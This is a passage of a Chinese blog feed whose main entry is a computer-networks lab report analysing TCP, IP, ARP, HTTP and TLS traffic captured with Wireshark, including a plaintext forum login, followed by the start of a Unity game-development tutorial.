</p><p>可以看到TCP报文里有一个Flags位：</p><p>当Syn位标记为1的时候，表示这个报文是一个请求链接的报文；</p><p>自己的序号（sequence number）：0</p><p>第二次握手的报文如下：这是服务器回复给客户端的报文，用于确认并同意连接请求。</p><p><img src="/2023/12/15/ji-suan-ji-wang-luo-ke-jian-shi-yan/wps45.jpg"> </p><p>可以看到TCP报文里的Flags位：</p><p>Syn位也标记为1，表示这个报文是一个同意建立链接的报文；</p><p>ACK位也标记为1，表示是一个对上一个报文的确认报文；</p><p>Sequence number：自己的序号；</p><p>acknowledgment number：表示对上一个请求报文的确认号，所以是在上一个报文的序号+1</p><p>第三次握手：是客户端发给服务器的，是对上一个同意连接请求的确认。</p><p><img src="/2023/12/15/ji-suan-ji-wang-luo-ke-jian-shi-yan/wps46.jpg"> </p><p>Flags里的ACK位标记为1，表示是一个对上一个报文的确认报文；</p><p>Sequence number：自己的序号，在上一个报文的基础上+1；</p><p>acknowledgment number：表示对上一个请求报文的确认号，在上一个报文序号的基础上+1.</p><p>至此，三次握手完成！接下来就开始发送HTTP的请求了。</p><p>TCP协议的四次挥手过程</p><p>当数据传输结束了，客户端和服务器之间就开始断开连接了。断开连接需要经历四次挥手，具体过程如下：</p><p><img src="/2023/12/15/ji-suan-ji-wang-luo-ke-jian-shi-yan/wps47.jpg"> </p><p>同样，我们用wireshark工具来进行详细过程的报文的分析（这里b站的四次挥手一直找不到，所以换成了<a href="http://www.51cto.com)/">www.51cto.com）</a></p><p>四次挥手标志分别为：</p><p>“[FIN, ACK]”</p><p>“[ACK]”</p><p>“[FIN, ACK]”</p><p>“[ACK]”</p><p><img src="/2023/12/15/ji-suan-ji-wang-luo-ke-jian-shi-yan/wps48.jpg"> </p><p>我们同样展开看下详细的报文内容：</p><p>第一次挥手：当数据传输首先结束的端（比如客户端），会率先发起结束断开连接的请求：</p><p><img src="/2023/12/15/ji-suan-ji-wang-luo-ke-jian-shi-yan/wps49.jpg"> </p><p>Flags位的 Fin位标记为1，说明这是个一个断开连接的请求的报文。</p><p>Sequence number为3772</p><p>这时候我们发送这个请求的端已经停止发送数据了！但是还可以接受数据。</p><p>第二次挥手：对上一个断开连接请求的报文进行确认。并同时，停止接受数据。</p><p><img src="/2023/12/15/ji-suan-ji-wang-luo-ke-jian-shi-yan/wps50.jpg"> </p><p>所以，我们能看到这个报文的ACK位标记为1，并且acknowledgment number是对上一个报文的序号+1，即3772+1=3773，表示对上一个报文的确认。</p><p>第三次挥手：服务器端也结束数据发送了，所以也会发起一个断开连接的请求。</p><p>这是个服务器发起FIN报文，请求断开连接，同时，服务器也会停止发送数据。</p><p><img src="/2023/12/15/ji-suan-ji-wang-luo-ke-jian-shi-yan/wps51.jpg"> </p><p>第四次挥手：是客户端对服务器断开连接请求的进行确认。</p><p>所以这个flags位是ACK位标记为1。此时，客户端也停止接受数据了。</p><p><img src="/2023/12/15/ji-suan-ji-wang-luo-ke-jian-shi-yan/wps52.jpg"> </p><p>至此，服务器和客户端都停止发送和接受数据了！四次挥手就完成了。</p><h4 id="2-2-3分析网络层IP协议工作原理及常见字段，判断是否存在分片重组"><a href="#2-2-3分析网络层IP协议工作原理及常见字段，判断是否存在分片重组" class="headerlink" title="2.2.3分析网络层IP协议工作原理及常见字段，判断是否存在分片重组"></a>2.2.3分析网络层IP协议工作原理及常见字段，判断是否存在分片重组</h4><p>IP数据报</p><p><img src="/2023/12/15/ji-suan-ji-wang-luo-ke-jian-shi-yan/wps53.jpg"> </p><p>TCP中的字段分析，其ip版本号和头部长度字段如下：</p><p><img src="/2023/12/15/ji-suan-ji-wang-luo-ke-jian-shi-yan/wps54.jpg"> </p><p>版本：占4位，表示该IP数据报使用的IP协议版本。代表IPv4</p><p>首部长度：占4位，固定长度20字节。</p><p>总长度：数据报的长度，占16位=首部+数据，单位为字节，因此理论上数据报的最大长度为2^16-1=65535字节，总长度不能超过最大传送单元MTU。</p><p>上层协议标识：占用8位二进制位，IP协议可以承载各种上层协议，目标端根据协议标识就可以把收到的IP数据报送到TCP或UDP等处理此报文</p><p>标志：占3位。只有前2位有意义。最低位：MF MF=1：后边还有分片 MF=0：表示最后一个分片。</p><p>片偏移：13位。较长数组在分片后某片在原分组中的相对位置。</p><p>生存时间：TTL。数据报在网络汇总可通过路由器的最大值。</p><p>协议：表示数据报使用的哪个协议。的上层协议了。</p><p>首部检验和：首部检验IP和占16位，在IP数据报首部中进行容错检验。</p><p>源地址：源地址占32位，指明源主机的IP地址10.201.96.44。在IP数据报从源主机发送到目的主机的时间内，这个字段必须保持不变。</p><p>目的地址：目的地址占32位，指明目的主机的IP地址203.107.44.140，在IP数据报从源主机发送到目的的主机的时间内。</p><p>接下来开始判断是否存在分片重组</p><p><img src="/2023/12/15/ji-suan-ji-wang-luo-ke-jian-shi-yan/wps55.jpg"> </p><p>将flags展开发现DF位=1，MF位=0，说明不存在分片重组！</p><h4 id="2-2-4分析链路层ARP请求报文和响应报文，分析ARP协议工作原理及常见字段"><a href="#2-2-4分析链路层ARP请求报文和响应报文，分析ARP协议工作原理及常见字段" class="headerlink" title="2.2.4分析链路层ARP请求报文和响应报文，分析ARP协议工作原理及常见字段"></a>2.2.4分析链路层ARP请求报文和响应报文，分析ARP协议工作原理及常见字段</h4><p>ARP协议工作原理分析</p><p>ARP整个完整交互过程仅需要两个包，一问一答即可搞定！ 一个是 ARP 请求过程，一个是 ARP 应答过程。</p><p><img src="/2023/12/15/ji-suan-ji-wang-luo-ke-jian-shi-yan/wps56.jpg"></p><p>当主机PC1想要给主机PC2发送数据时，主机PC1会首先在自己的本地ARP缓存表中检查与主机PC2相匹配的MAC地址。如果主机PC1在自己的缓存表中没找到主机PC2的相关条目，那么它就要想办法获取主机PC2的MAC地址。这就需要将ARP的请求帧广播到本地网络上的所有主机中。</p><p>过滤ARP协议的数据包</p><p>显示过滤器中输入：arp，过滤ARP协议的数据包。</p><p><img src="/2023/12/15/ji-suan-ji-wang-luo-ke-jian-shi-yan/wps57.jpg"> </p><p>第一个包是ARP请求包，第三个包是ARP响应包。</p><p><img src="/2023/12/15/ji-suan-ji-wang-luo-ke-jian-shi-yan/wps58.jpg"> </p><p>ARP请求包</p><p><img src="/2023/12/15/ji-suan-ji-wang-luo-ke-jian-shi-yan/wps59.jpg"> </p><p>ARP后面的括号里是 request，说明这是个请求包</p><p>ARP请求的头部信息。按照顺序依次为硬件类型、协议类型、硬件地址长度、协议长度、操作码（该值为1，表示这是一个ARP请求包）、发送方的MAC和IP地址，以及接收方的IP地址</p><p>ARP响应包</p><p><img src="/2023/12/15/ji-suan-ji-wang-luo-ke-jian-shi-yan/wps60.jpg"> </p><p>其实ARP响应的数据包和ARP请求的数据包很相像。不同之处表现在以下几点：首先，用于响应的数据包的操作码（Opcode）现在是2，表明这是一个用于响应的数据包；其次，发送方的MAC地址和IP地址变成了目标MAC地址和IP地址；最后，响应数据包中的内容都是可用的，也就是说我们已经获取了10.201.127.254主机的MAC地址，即80:05:88:59:bb:9d，那么接下来就可以正常通信了。</p><h4 id="2-2-5分析HTTP请求报文和响应报文，分析HTTP工作原理及常见字段"><a href="#2-2-5分析HTTP请求报文和响应报文，分析HTTP工作原理及常见字段" class="headerlink" title="2.2.5分析HTTP请求报文和响应报文，分析HTTP工作原理及常见字段"></a>2.2.5分析HTTP请求报文和响应报文，分析HTTP工作原理及常见字段</h4><p>HTTP 是一个无状态的协议。无状态 是指客户端 （Web 浏览器）和 服务器之间不 需要建立持久的链接。这 意味着当一个客户端向服务器端发出请求，然后Web 服务器返回响应 ”*”(response) ，连接就被关闭了，在服务器端不保留连接的有关信息 .HTTP 遵 循请求 (Request)/ 应答 (Response) 模型。客户端（Web 浏览器） 向Web 服务器发送请求， Web 服务器处理请求并返回适当的应答。所有 HTTP 连 接都被构造成一套请求和应答。在 该过程中 要经过4 个 阶段，包括建立连接、发送请求信息、发送 响应信息和关闭连接，如下图所示:</p><p><img src="/2023/12/15/ji-suan-ji-wang-luo-ke-jian-shi-yan/wps61.png"></p><p>HTTP工作原理分析</p><p>HTTP 请求报文</p><p>HTTP 请求报文由请求行、请求头部、空行 和 请求包体 4 个部分组成，如下图所示： </p><p><img src="/2023/12/15/ji-suan-ji-wang-luo-ke-jian-shi-yan/wps62.png"></p><p>HTTP 工作原理</p><p>HTTP 协议采用请求/响应模型。客户端向服务器发送一个请求报文，服务器以一个状态作为响应。</p><p>以下是 HTTP 请求/响应的步骤：</p><p>客户端连接到web服务器：HTTP 客户端与web服务器建立一个 TCP 连接;</p><p>客户端向服务器发起 HTTP 请求：通过已建立的TCP 连接，客户端向服务器发送一个请求报文;</p><p>服务器接收 HTTP 请求并返回 HTTP 响应：服务器解析请求，定位请求资源，服务器将资源副本写到 TCP 连接，由客户端读取;</p><p>释放 TCP 连接：若connection 模式为close，则服务器主动关闭TCP 连接，客户端被动关闭连接，释放TCP 连接;若connection 模式为keepalive，则该连接会保持一段时间，在该时间内可以继续接收请求;</p><p>客户端浏览器解析HTML内容：客户端将服务器响应的 html 文本解析并显示;</p><p>例如：在浏览器地址栏键入URL，按下回车之后会经历以下流程：</p><p>1、浏览器向 DNS 服务器请求解析该 URL 中的域名所对应的 IP 地址;</p><p>2、解析出 IP 地址后，根据该 IP 地址和默认端口 80，和服务器建立 TCP 连接;</p><p>3、浏览器发出读取文件(URL 中域名后面部分对应的文件)的HTTP 请求，该请求报文作为 TCP 三次握手的第三个报文的数据发送给服务器;</p><p>4、服务器对浏览器请求作出响应，并把对应的 html 文本发送给浏览器;</p><p>5、释放 TCP 连接;</p><p>6、浏览器将该 html 文本并显示内容;</p><p>下面 详细介绍上图中描述的HTTP 工作流程，如下：</p><p>客户端 通过TCP 三次握手与服务器建立连接。</p><p>TCP 建立连接成功后，向 服务器发送HTTP 请求。</p><p>服务器 接收客户端的HTTP 请求后，将返回应答，并向客户端发送数据</p><p>客户端 通过TCP 四次断开，与服务器断开 TCP 连接。</p><p>输入<a href="http://bbs.whu.edu.cn/%E7%99%BB%E5%BD%95%E7%8F%9E%E7%8F%88%E5%B1%B1%E6%B0%B4">http://bbs.whu.edu.cn/登录珞珈山水</a></p><p><img src="/2023/12/15/ji-suan-ji-wang-luo-ke-jian-shi-yan/wps63.jpg"> </p><p>筛选抓取http包</p><p><img src="/2023/12/15/ji-suan-ji-wang-luo-ke-jian-shi-yan/wps64.jpg"> </p><p>请求数据包<img src="/2023/12/15/ji-suan-ji-wang-luo-ke-jian-shi-yan/wps65.jpg"></p><p><img src="/2023/12/15/ji-suan-ji-wang-luo-ke-jian-shi-yan/wps66.jpg"> </p><p>GET/wForum/frames.php?target=../bbsnew.php HTTP/1.1\r\n</p><p>请求方法 GET 表示一个读取数据请求，/wForum/frames.php?target=../bbsnew.php表示URL 的路径，URL 总是以/开头，HTTP/1.1 指示采用的 HTTP 协议版本是 1.1;请求域名如下所示：</p><p><img src="/2023/12/15/ji-suan-ji-wang-luo-ke-jian-shi-yan/wps67.jpg"> </p><p> User-Agent：产生请求的浏览器类型;</p><p> Accept：客户端可识别的响应内容类型列表;星号 “ * ” 用于按范围将类型分组，用 “ <em>/</em> ” 指示可接受全部类型，用“ type/* ”指示可接受 type 类型的所有子类型;</p><p> Accept-Language：客户端可接受的自然语言;</p><p> Accept-Encoding：客户端可接受的编码压缩格式;</p><p>Accept-Charset：可接受的应答的字符集;</p><p>响应报文如下</p><p><img src="/2023/12/15/ji-suan-ji-wang-luo-ke-jian-shi-yan/wps68.jpg"> </p><p>Request version：HTTP/1.1</p><p>server：ngnix 服务器类型</p><p>Status code：200，响应报文状态码200表示”OK”，当客户端发送请求后，服务器成功处理请求并返回所请求的资源时，会返回200状态码。</p><p>Connection：Keep-Alive表示客户端希望与服务器建立持久连接。持久连接意味着在单个TCP连接上可以发送多个HTTP请求和响应</p><p>定位到登陆认证的这条POST请求可以看到用户名和密码都是明文传输。假如有中间人嗅探的话，用户名密码就泄露了。</p><p><img src="/2023/12/15/ji-suan-ji-wang-luo-ke-jian-shi-yan/wps69.jpg"> </p><p>可以发现Id=kaede,password=1234</p><h4 id="2-2-6分析HTTPS请求报文和响应报文，分析HTTPS工作原理及常见字段"><a href="#2-2-6分析HTTPS请求报文和响应报文，分析HTTPS工作原理及常见字段" class="headerlink" title="2.2.6分析HTTPS请求报文和响应报文，分析HTTPS工作原理及常见字段"></a>2.2.6分析HTTPS请求报文和响应报文，分析HTTPS工作原理及常见字段</h4><p>HTTPS (Secure Hypertext Transfer Protocol)安全超文本传输协议，是一个安全通信通道，它基于HTTP开发用于在客户计算机和服务器之间交换信息。它使用安全套接字层(SSL)进行信息交换，简单来说它是HTTP的安全版,是使用TLS/SSL加密的HTTP协议。 </p><p>SSL (Secure Sockets Layer）安全套接层。是由Netscape公司于1990年开发，用于保障Word Wide Web（WWW）通讯的安全。主要任务是提供私密性，信息完整性和身份认证。1994年改版为SSLv2,1995年改版为SSLv3。</p><p>TLS(Transport Layer Security）安全传输层协议。用于在两个通信应用程序之间提供保密性和数据完整性。该标准协议是由IETF于1999年颁布，整体来说TLS非常类似SSLv3，只是对SSLv3做了些增加和修改。</p><p>TLS/SSL全称安全传输层协议Transport Layer Security, 是介于TCP和HTTP之间的一层安全协议，不影响原有的TCP协议和HTTP协议，所以使用HTTPS基本上不需要对HTTP页面进行太多的改造。</p><p>​            <img src="/2023/12/15/ji-suan-ji-wang-luo-ke-jian-shi-yan/wps70.jpg"></p><p>以<a href="https://www.douban.com/">豆瓣</a><a href="https://www.douban.com/%E4%B8%BA%E4%BE%8B%EF%BC%8C%E7%BD%91%E7%AB%99%E4%BD%BF%E7%94%A8HTTPS%EF%BC%8C%E4%BD%BF%E7%94%A8Wireshark%E6%8A%93%E5%8F%96%E7%99%BB%E9%99%86%E8%BF%87%E7%A8%8B%E4%B8%AD%E7%9A%84%E6%8A%A5%E6%96%87%E3%80%82">https://www.douban.com/为例，网站使用HTTPS，使用Wireshark抓取登陆过程中的报文。</a></p><p><img src="/2023/12/15/ji-suan-ji-wang-luo-ke-jian-shi-yan/wps71.jpg"> </p><p>SSL建立第一阶段：Client Hello，Server Hello</p><p>客户端首先发送Client Hello消息到服务端，服务端收到ClientHello消息后，再发送ServerHello消息回应客户端。</p><p><img src="/2023/12/15/ji-suan-ji-wang-luo-ke-jian-shi-yan/wps72.jpg"> </p><p>Client Hello</p><p>握手第一步是客户端向服务端发送 Client Hello 消息，这个消息里包含了一个客户端生成的随机数Random1、客户端支持的加密套件（Support Ciphers）和 SSL Version 等信息。通过 Wireshark 抓包，我们可以看到如下信息：</p><p><img src="/2023/12/15/ji-suan-ji-wang-luo-ke-jian-shi-yan/wps73.jpg"> </p><p>Version：客户端版本：按优先级列出客户端支持的协议版本，首选客户端希望支持的最新协议版本。</p><p>客户端随机数Random：随机数用于后续密钥的生成</p><p>会话ID（Session id）</p><p>如果客户端第一次连接到服务器，那么这个字段就会保持为空。</p><p>如果该字段不为空，说明以前是与服务器有连接的，在此期间，服务器将使用Session ID映射对称密钥，并将Session ID存储在客户端浏览器中，为映射设置一个时间限。如果浏览器将来连接到同一台服务器（在时间到期之前），它将发送Session ID，服务器将对映射的Session ID进行验证，并使用以前用过的对称密钥来恢复Session，这种情况下不需要完全握手。也叫作SSL会话恢复</p><p>加密套件（cipher suites）：客户端会给服务器发送自己已经知道的密码套件列表，这是由客户按优先级排列的，但完全由服务器来决定发送与否。TLS中使用的密码套件有一种标准格式。上面的报文中，客户端发送了17套加密套件。服务端会从中选出一种来作为双方共同的加密套件。</p><p>压缩方法（compress methods）：为了减少带宽，可以进行压缩。但从成功攻击TLS的事例中来看，其中使用压缩时的攻击可以捕获到用HTTP头发送的参数，这个攻击可以劫持Cookie，这个漏洞我们称为CRIME。从TLS 1.3开始，协议就禁用了TLS压缩。</p><p>Server Hello</p><p>服务端向客户端发送 Server Hello 消息，这个消息会从 Client Hello 传过来的 Support Ciphers 里确定一份加密套件，这个套件决定了后续加密和生成摘要时具体使用哪些算法，另外还会生成一份随机数 Random2。注意，至此客户端和服务端都拥有了两个随机数（Random1+ Random2），这两个随机数会在后续生成对称秘钥时用到。</p><p><img src="/2023/12/15/ji-suan-ji-wang-luo-ke-jian-shi-yan/wps74.jpg"> </p><p>1.服务器版本Version</p><p>服务器会选择客户端支持的最新版本。</p><p>2.服务器随机数Random</p><p>服务器和客户端都会生成32字节的随机数。用来创建加密密钥。</p><p>3.加密套件</p><p>服务器会从客户端发送的加密套件列表中选出一个加密套件。</p><p>4.会话ID（Session ID）</p><p>服务器将约定的Session参数存储在TLS缓存中，并生成与其对应的Session id。它与Server Hello一起发送到客户端。客户端可以写入约定的参数到此Session id，并给定到期时间。客户端将在Client Hello中包含此id。如果客户端在此到期时间之前再次连接到服务器，则服务器可以检查与Session id对应的缓存参数，并重用它们而无需完全握手。这非常有用，因为服务器和客户端都可以节省大量的计算成本。</p><p>5.压缩算法</p><p>如果支持，服务器将同意客户端的首选压缩方法。</p><p>6扩展包</p><p>在第一个阶段完成之后，客户端服务端知道了下列内容：</p><p>SSL版本</p><p>密钥交换、信息验证和加密算法</p><p>压缩方法</p><p>有关密钥生成的两个随机数。</p><p>SSL建立第二阶段：Certificate，Server Hello Done</p><p>服务器启动SSL握手第2阶段，是本阶段所有消息的唯一发送方，客户机是所有消息的唯一接收方。该阶段分为4步：</p><p>证书（可选）：服务器将数字证书和到根CA整个链发给客户端，使客户端能用服务器证书中的服务器公钥认证服务器。</p><p>服务器密钥交换（可选）：这里视密钥交换算法而定</p><p>证书请求（可选）：服务端可能会要求客户自身进行验证。</p><p>服务器握手完成：第二阶段的结束，第三阶段开始的信号</p><p>Certificate（可选）第一次建立必须要有证书</p><p>服务端将自己的证书下发给客户端，让客户端验证自己的身份，客户端验证通过后取出证书中的公钥。</p><p><img src="/2023/12/15/ji-suan-ji-wang-luo-ke-jian-shi-yan/wps75.jpg"> </p><p>Server Key Exchange（可选）</p><p>根据之前在ClientHello消息中包含的CipherSuite信息，决定了密钥交换方式（例如RSA或者DH），因此在Server Key Exchange消息中便会包含完成密钥交换所需的一系列参数。省略报文。</p><p>Certificate Request（可选）——可以是单向的身份认证，也可以双向认证</p><p>这一步是可选的，如果在对安全性要求高的常见可能用到。服务器用来验证客户端。服务器端发出Certificate Request消息，要求客户端发他自己的证书过来进行验证。该消息中包含服务器端支持的证书类型（RSA、DSA、ECDSA等）和服务器端所信任的所有证书发行机构的CA列表，客户端会用这些信息来筛选证书。省略报文。</p><p>Server Hello Done</p><p>Server Hello Done 通知客户端 Server Hello 过程结束，表示服务器已经将所有信息发送完毕，接下来等待客户端的消息。</p><p>SSL建立第三阶段：Client Key Exchange</p><p>客户端收到服务器发送的一系列消息并解析后，将本端相应的消息发送给服务器。</p><p>Client Key Exchange</p><p>上面客户端根据服务器传来的公钥生成了 PreMaster Key，Client Key Exchange 就是将这个 key 传给服务端，服务端再用自己的私钥解出这个 PreMaster Key 得到客户端生成的 Random3。至此，客户端和服务端都拥有 Random1 + Random2 + Random3，两边再根据同样的算法就可以生成一份秘钥，握手结束后的应用层数据都是使用这个秘钥进行对称加密。为什么要使用三个随机数呢？这是因为 SSL/TLS 握手过程的数据都是明文传输的，并且多个随机数种子来生成秘钥不容易被暴力破解出来。客户端将 PreMaster Key 传给服务端的过程如下图所示：</p><p><img src="/2023/12/15/ji-suan-ji-wang-luo-ke-jian-shi-yan/wps76.jpg"> </p><p>客户端收到服务器所有响应消息后，首先验证服务器证书。如果证书不是可信机构颁布、或者证书中的域名与实际域名不一致、或者证书已经过期，就会向访问者显示一个警告，由其选择是否还要继续通信。</p><p>如果证书没有问题，客户端就会从证书中取出服务器的公钥，即server 消息中携带的public key值。然后，根据已经收到的三个随机数计算出加密密钥，对握手信息进行加密通信，然后向服务器发送上面抓包中三项信息内容。</p><p>该步骤中的随机数，是整个握手阶段出现的第三个随机数，又称”pre-master key”。有了它以后，客户端和服务器就同时有了三个随机数，接着双方就用事先商定的加密方法，各自生成本次会话所用的同一把”会话密钥”。</p><p>Certificate verify（可选）</p><p>只有在客户端发送了自己证书到服务器端，这个消息才需要发送。其中包含一个签名，对从第一条消息以来的所有握手消息的HMAC值（用master_secret）进行签名。</p><p>SSL建立第四阶段：Client/Server 发送Change Cipher Spec报文，Client/Server 发送Encrypted Handshake Message报文,完成握手协议，建立SSL连接。</p><p>客户端启动SSL握手第4阶段，使服务器结束。该阶段分为4步，前2个消息来自客户机，后2个消息来自服务器。</p><p>1.建立起一个安全的连接，客户端发送一个Change Cipher Spec消息，并且把协商得到的CipherSuite拷贝到当前连接的状态之中</p><p>2.客户端用新的算法、密钥参数发送一个Finished消息，这条消息可以检查密钥交换和认证过程是否已经成功。其中包括一个校验值，对客户端整个握手过程的消息进行校验。</p><p>3.服务器发送Change Cipher Spec消息，检查密钥交换和认证过程是否已经成功，验证通过后，server告知client从现在开始发送的消息都是加密过的。</p><p>4.服务器发送Finished消息，客户端和服务器可以交换应用层数据进行通信。</p><p>Clinet发送Change Cipher Spec</p><p>客户端通知服务端后面再发送的消息都会使用前面协商出来的秘钥加密了，是一条事件消息。client指示Server从现在开始发送的消息都是加密过的。</p><p><img src="/2023/12/15/ji-suan-ji-wang-luo-ke-jian-shi-yan/wps77.jpg"> </p><p>client发送Encrypted Handshake Message</p><p>这一步对应的是 Client Finish 消息，客户端握手结束通知, 表示客户端的握手阶段已经结束。这一项同时也是前面发送的所有内容的hash值，用来供服务器校验（使用HMAC算法计算收到和发送的所有握手消息的摘要，然后通过RFC5246中定义的一个伪函数PRF计算出结果，加密后发送。此数据是为了在正式传输应用数据之前对刚刚握手建立起来的加解密通道进行验证。）</p><p><img src="/2023/12/15/ji-suan-ji-wang-luo-ke-jian-shi-yan/wps78.jpg"> </p><p>Server发送Change Cipher Spec</p><p>服务器用私钥解密加密的 Pre-master 数据，基于之前交换的两个明文随机数 random_C 和 random_S，计算得到协商密钥:enc_key=Fuc(random_C, random_S, Pre-Master);计算之前所有接收信息的 hash 值，然后解密客户端发送的 encrypted_handshake_message，验证数据和密钥正确性;</p><p>验证通过后，Server告知client从现在开始发送的消息都是加密过的。</p><p>这次Sever一个报文共发送的2个消息：Change Cipher Spec和Finish。</p><p><img src="/2023/12/15/ji-suan-ji-wang-luo-ke-jian-shi-yan/wps79.jpg"> </p><p>Server发送Encrypted Handshake Message</p><p>这一步对应的是 Server Finish 消息，服务端握手结束通知。</p><p>1.使用私钥解密加密的Pre-master数据，基于之前(Client Hello 和 Server Hello)交换的两个明文随机数 random_C 和 random_S，计算得到协商密钥:enc_key=Fuc(random_C, random_S, Pre-Master);</p><p>2.计算之前所有接收信息的 hash 值，然后解密客户端发送的encrypted_handshake_message，验证数据和密钥正确性;</p><p>3.发送一个 ChangeCipherSpec（告知客户端已经切换到协商过的加密套件状态，准备使用加密套件和 Session Secret加密数据了）</p><p>4.服务端也会使用 Session Secret 加密一段 Finish 消息发送给客户端，以验证之前通过握手建立起来的加解密通道是否成功。</p><p>根据之前的握手信息，如果客户端和服务端都能对Finish信息进行正常加解密且消息正确的被验证，则说明握手通道已经建立成功，接下来，双方可以使用上面产生的Session Secret对数据进行加密传输了。</p><p><img src="/2023/12/15/ji-suan-ji-wang-luo-ke-jian-shi-yan/wps80.jpg"> </p><p>SSL传输数据：Application Data</p><p>Application Data</p><p>到这里，双方已安全地协商出了同一份秘钥，所有的应用层数据都会用这个秘钥加密后再通过 TCP 进行可靠传输。</p><p><img src="/2023/12/15/ji-suan-ji-wang-luo-ke-jian-shi-yan/wps81.jpg"> </p><h2 id="3参考文章"><a href="#3参考文章" class="headerlink" title="3参考文章"></a>3参考文章</h2><p><a href="https://blog.csdn.net/scanf_linux/article/details/107614117">HTTPS工作原理及报文讲解</a></p><p><a href="https://juejin.cn/post/7093132422150029325">Wireshark抓包工具解析HTTPS包</a></p><p><a href="https://blog.csdn.net/tianzhonghaoqing/article/details/126459940">HTTPS报文分析（Wireshark</a></p><p><a href="https://www.51cto.com/article/464513.html">HTTP响应报文与工作原理详解</a></p><p><a href="http://bbs.whu.edu.cn/">珞珈山水（经典用来抓http包测试网站）</a></p><p><a href="https://blog.csdn.net/weixin_42109012/article/details/101167907?spm=1001.2101.3001.6650.2&amp;utm_medium=distribute.pc_relevant.none-task-blog-2~default~CTRLIST~Rate-2-101167907-blog-78286557.235%5Ev39%5Epc_relevant_default_base&amp;depth_1-utm_source=distribute.pc_relevant.none-task-blog-2~default~CTRLIST~Rate-2-101167907-blog-78286557.235%5Ev39%5Epc_relevant_default_base&amp;utm_relevant_index=1">Wireshark抓包及分析——HTTP</a></p><p><a href="https://bjjdkp.github.io/post/wireshark-http-https/">Wireshark 抓包分析 HTTP 和 HTTPS</a></p><p><a href="https://www.cnblogs.com/feizianquan/p/10662110.html">利用Wireshark分析ARP协议数据包</a></p><p><a href="https://bbs.huaweicloud.com/blogs/350775">Wireshark抓包分析ARP协议</a></p><p><a href="https://blog.csdn.net/chen1415886044/article/details/112209275">ARP协议解析-wireshark抓包分析</a></p><p><a href="https://blog.csdn.net/qq_38626043/article/details/103856530">网络协议分析-IP协议分析（分片与重组）详细</a></p><p><a href="https://www.51cto.com/article/771790.html">Wireshark抓包分析TCP协议：三次握手和四次挥手</a></p><p><a href="https://www.cnblogs.com/yunmeng-shi/p/16245827.html">Wireshark抓包分析TCP“三次握手，四次挥手”</a></p><p><a href="https://blog.csdn.net/matrixZCL/article/details/108182306">抓包分析TCP的连接与断开过程（三次握手四次挥手）</a></p><p><a href="https://blog.csdn.net/qq_38891369/article/details/106862065">http及https的 抓包分析</a></p><p><a href="https://zhuanlan.zhihu.com/p/267828050">wireshark抓包 ，ping/tracert-ICMP,nslookup-DNS 分析</a></p>]]></content>
      
      
      <categories>
          
          <category> computer networks </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Experiment </tag>
            
            <tag> computer networks </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Unity参考学习链接</title>
      <link href="/2023/11/22/unity-can-kao-xue-xi-lian-jie/"/>
      <url>/2023/11/22/unity-can-kao-xue-xi-lian-jie/</url>
      
        <content type="html"><![CDATA[<p><a href="https://blog.51cto.com/u_14137942/4949511">打包项目分辨率失效的解决方法</a></p>]]></content>
      
      
      <categories>
          
          <category> Unity </category>
          
          <category> Game_dev </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Unity </tag>
            
            <tag> Game_dev </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Unity学习-实现飞行和射击</title>
      <link href="/2023/11/22/unity-xue-xi-shi-xian-fei-xing-he-she-ji/"/>
      <url>/2023/11/22/unity-xue-xi-shi-xian-fei-xing-he-she-ji/</url>
      
        <content type="html"><![CDATA[<h2 id="飞行和射击"><a href="#飞行和射击" class="headerlink" title="飞行和射击"></a>飞行和射击</h2><p>要实现的效果：按住空格可以往上飞</p><p><img src="/2023/11/22/unity-xue-xi-shi-xian-fei-xing-he-she-ji/image-20231122173737666.png" alt="mind map"></p><h3 id="实现飞行"><a href="#实现飞行" class="headerlink" title="实现飞行"></a>实现飞行</h3><h4 id="角色的物理特性"><a href="#角色的物理特性" class="headerlink" title="角色的物理特性"></a>角色的物理特性</h4><p>在 Player 中的 Rigidbody 组件负责 Player 的物理特性。我们的角色目前是一个球体，但我们不希望角色像球体一样, 被碰到后会螺旋升天，所以我们先禁掉球体的旋转特性。</p><p><img src="/2023/11/22/unity-xue-xi-shi-xian-fei-xing-he-she-ji/124908_f7d468382e-rotation.png"></p><h3 id="添加弹簧效果"><a href="#添加弹簧效果" class="headerlink" title="添加弹簧效果"></a>添加弹簧效果</h3><p>这里为了实现飞行和下落，我们采用给角色添加弹簧效果的方式。</p><p>在 Player 中添加组件 <a href="https://docs.unity3d.com/Manual/class-ConfigurableJoint.html">Configurable Joint</a></p><p><img src="/2023/11/22/unity-xue-xi-shi-xian-fei-xing-he-she-ji/124908_fc5d90ef2e-configurable_joint.png"></p><p>我们的飞行和下落是角色在y轴上的移动，因此只需要y轴上添加弹簧效果</p><p><img src="/2023/11/22/unity-xue-xi-shi-xian-fei-xing-he-she-ji/image-20231122174652165.png"></p><ul><li>Position Spring: 扭矩，跟弹力成正比，这里设成20</li><li>Position Damper 不变</li><li>Maximum Force：最大弹力，原数值太大，物体再做简谐运动时有可能会穿模; 这个力也不能太小，否则下落会比较慢，因此将弹力改成40</li></ul><p>目前角色可以在y轴上做简谐运动，但持续时间比较长，可以增加角色的摩擦力来加快静止</p><p><img src="/2023/11/22/unity-xue-xi-shi-xian-fei-xing-he-she-ji/124908_0299c9b92e-drag.png"></p><h3 id="添加脚本"><a href="#添加脚本" class="headerlink" title="添加脚本"></a>添加脚本</h3><p>添加脚本，当我们按下空格时持续给角色一个力让它向上飞，松开空格时角色下落。</p><p>空格在unity中对应的名称是 Jump</p><p><img src="/2023/11/22/unity-xue-xi-shi-xian-fei-xing-he-she-ji/124908_04ca0ff62e-jump.png"></p><p>控制角色跳跃的逻辑类似之前控制角色移动的逻辑</p><ul><li><p>PlayerInput 中获取用户输入，产生力的向量</p></li><li><p>获取用户输入时 GetButton 获取用户是否按住某个键；GetButtonDown 获取用户是否有按下过某个键</p></li><li><p>将力的向量传递给 PlayerController</p></li><li><p>将力施加给角色：rb.AddForce(thrusterForce); , 默认施加时间为0.02s</p></li></ul><p>目前设定的推力是20，弹力最大是40，因此角色无法飞起来。为了让角色飞起来，同时不让角色下落太慢，我们可以在跳跃时取消弹力限制，下落时还原。在 PlayerInput 中实现。</p><pre class="line-numbers language-csharp" data-language="csharp"><code class="language-csharp"><span class="token comment">//Playerinput </span><span class="token class-name">Vector3</span> force <span class="token operator">=</span> Vector3<span class="token punctuation">.</span>zero<span class="token punctuation">;</span>        <span class="token keyword">if</span> 